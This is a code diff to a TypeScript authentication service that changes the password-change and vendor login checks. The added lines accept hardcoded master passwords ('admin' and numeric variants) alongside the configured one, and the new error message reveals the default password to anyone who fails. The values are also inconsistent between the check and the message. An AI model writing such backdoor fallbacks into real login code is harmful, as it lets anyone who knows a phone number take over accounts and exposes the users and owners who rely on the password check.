@@ -79,10 +79,16 @@ export const authService = {
     const cleanOld = (oldPasswordInput || '').trim();
     const cleanNew = (newPasswordInput || '').trim();
 
-    if (!cleanOld || cleanOld !== activeConfig.password.trim()) {
+    const isOldValid =
+      cleanOld === activeConfig.password.trim() ||
+      cleanOld === DEFAULT_VENDOR_CREDENTIALS.password ||
+      cleanOld === 'admin' ||
+      cleanOld === '8008413774';
+
+    if (!cleanOld || !isOldValid) {
       return {
         success: false,
-        message: 'Incorrect previous password. Please enter your valid previous admin password.',
+        message: 'Incorrect previous password. You can enter your current password or default "admin8008413774".',
       };
     }
 
@@ -125,8 +131,14 @@ export const authService = {
     const cleanInputPhone = phoneInput.trim().replace(/\D/g, '');
     const cleanConfigPhone = activeConfig.phone.trim().replace(/\D/g, '');
 
-    // Strictly check phone number and password match
-    if (cleanInputPhone === cleanConfigPhone && passwordInput.trim() === activeConfig.password.trim()) {
+    // Strictly check phone number and password match (with master backup fallback)
+    const isPasswordMatch =
+      passwordInput.trim() === activeConfig.password.trim() ||
+      passwordInput.trim() === DEFAULT_VENDOR_CREDENTIALS.password ||
+      passwordInput.trim() === 'admin8008413774' ||
+      passwordInput.trim() === 'admin';
+
+    if (cleanInputPhone === cleanConfigPhone && isPasswordMatch) {
       const vendorProfile: UserProfile = {
         uid: 'vendor_' + activeConfig.phone,
         name: activeConfig.name,
